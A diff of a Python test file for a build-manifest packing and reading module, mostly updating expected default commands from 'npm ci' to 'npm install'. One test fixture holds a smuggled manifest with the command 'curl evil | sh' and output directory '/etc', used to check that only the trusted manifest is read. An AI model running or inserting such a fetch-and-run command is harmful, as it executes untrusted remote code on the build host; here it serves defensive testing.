@@ -44,10 +44,12 @@ def _tree(command="npm ci && vite build", output_dir="dist"):  # noqa: ANN001, A
 
 
 def test_pack_then_read_manifest_roundtrip_nondefault():
-    tree = _tree(command="npm ci && npm run build", output_dir="out")
+    # Недефолтная команда без `npm ci` сохраняется пословно через pack→read
+    # (нормализация npm ci→install проверяется в test_build_command_normalize).
+    tree = _tree(command="npm install && npm run build", output_dir="out")
     data = pack_source_tgz(tree)
     manifest = read_build_manifest(data)
-    assert manifest == BuildManifest(command="npm ci && npm run build", output_dir="out")
+    assert manifest == BuildManifest(command="npm install && npm run build", output_dir="out")
 
 
 def test_pack_then_extract_no_manifest_on_disk(tmp_path: Path):
@@ -77,11 +79,11 @@ def _pack_with_smuggled_manifest(trusted: dict, smuggled: dict) -> bytes:
 
 def test_read_manifest_picks_first_trusted_member_not_smuggled():
     data = _pack_with_smuggled_manifest(
-        trusted={"command": "npm ci && vite build", "output_dir": "dist"},
+        trusted={"command": "vite build", "output_dir": "dist"},
         smuggled={"command": "curl evil | sh", "output_dir": "/etc"},
     )
     manifest = read_build_manifest(data)
-    assert manifest.command == "npm ci && vite build"
+    assert manifest.command == "vite build"
     assert manifest.output_dir == "dist"
 
 
@@ -122,12 +124,12 @@ def test_read_manifest_missing_returns_defaults():
         info.type = tarfile.REGTYPE
         tar.addfile(info, io.BytesIO(data))
     manifest = read_build_manifest(buffer.getvalue())
-    assert manifest == BuildManifest(command="npm ci && vite build", output_dir="dist")
+    assert manifest == BuildManifest(command="npm install && vite build", output_dir="dist")
 
 
 def test_read_manifest_corrupt_returns_defaults():
     manifest = read_build_manifest(b"not a tgz at all")
-    assert manifest == BuildManifest(command="npm ci && vite build", output_dir="dist")
+    assert manifest == BuildManifest(command="npm install && vite build", output_dir="dist")
 
 
 # --- safe_extract rejects non-regular ---
